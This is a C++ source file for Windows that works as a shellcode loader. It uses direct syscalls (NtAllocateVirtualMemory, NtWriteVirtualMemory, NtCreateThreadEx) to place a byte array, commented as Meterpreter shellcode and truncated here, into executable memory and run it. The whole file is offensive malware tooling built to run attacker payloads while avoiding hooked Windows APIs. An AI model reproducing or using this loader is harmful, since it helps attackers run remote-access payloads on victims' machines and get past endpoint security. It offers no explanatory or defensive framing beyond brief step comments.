#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xa6\x12\xd9...";


    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(code);
    HANDLE hThread;
    NTSTATUS status;

    allocation_start = nullptr;


    // Allocate Virtual Memory 
    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    // Copy shellcode into allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0);


    // Execute shellcode in memory 
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);


    // Wait for the end of the thread and close the handle
    NtWaitForSingleObject(hThread, FALSE, NULL);
    NtClose(hThread);

    return 0;
}